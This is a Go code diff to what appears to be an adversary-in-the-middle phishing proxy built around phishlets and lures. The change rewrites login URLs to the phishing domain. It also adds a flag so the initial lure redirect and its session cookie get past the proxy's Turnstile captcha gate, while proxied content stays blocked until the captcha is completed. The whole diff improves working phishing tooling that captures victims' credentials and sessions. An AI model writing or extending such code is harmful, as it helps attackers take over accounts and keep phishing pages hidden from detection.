@@ -100,6 +100,7 @@ type ProxySession struct {
     PhishletName string
     Index        int
     LureHostname string // custom lure subdomain (full hostname), if different from phishlet landing host
+    LureRedirect bool   // true when this response is the initial lure redirect (not proxied upstream content)
 }
 
 // set the value of the specified key in the JSON body
@@ -649,18 +650,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                     foundLure, lureErr := p.cfg.GetLureByPath(pl_name, o_host, req_path)
                     if lureErr == nil {
                         rurl := pl.GetLoginUrl()
+                        // Rewrite the login URL to the phished domain here in the request
+                        // handler. Do NOT rely solely on OnResponse rewriting — synthetic
+                        // redirect responses may bypass it (e.g. when Turnstile is on and
+                        // IsCaptchaDone is false, OnResponse returns early before rewriting).
+                        if rewritten, ok := p.replaceUrlWithPhished(rurl); ok {
+                            rurl = rewritten
+                        }
                         u, parseErr := url.Parse(rurl)
                         if parseErr == nil {
                             if strings.ToLower(req_path) != strings.ToLower(u.Path) {
                                 if foundLure.Hostname != "" && foundLure.Hostname != pl.GetLandingPhishHost() {
-                                    // Custom lure hostname: redirect directly to lure host + login path,
-                                    // bypassing response-handler host rewrite so the URL stays on the custom sub.
                                     rurl = "https://" + foundLure.Hostname + u.Path
                                     ps.LureHostname = foundLure.Hostname
                                 }
                                 resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
                                 if resp != nil {
                                     resp.Header.Add("Location", rurl)
+                                    ps.LureRedirect = true
                                     return req, resp
                                 }
                             }
@@ -1035,8 +1042,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 }
             }
 
-            // TURNSTILE: block response if captcha not completed
-            if p.turnstile {
+            // TURNSTILE: block proxied upstream content until captcha is completed.
+            // Skip this gate for the initial lure redirect (LureRedirect=true) — that
+            // response is a synthetic 302 we generated, not upstream content, and we
+            // need the Location and session cookie to reach the client unchanged.
+            if p.turnstile && !ps.LureRedirect {
                 if s, ok := p.sessions[ps.SessionId]; ok {
                     if !s.IsCaptchaDone {
                         return resp
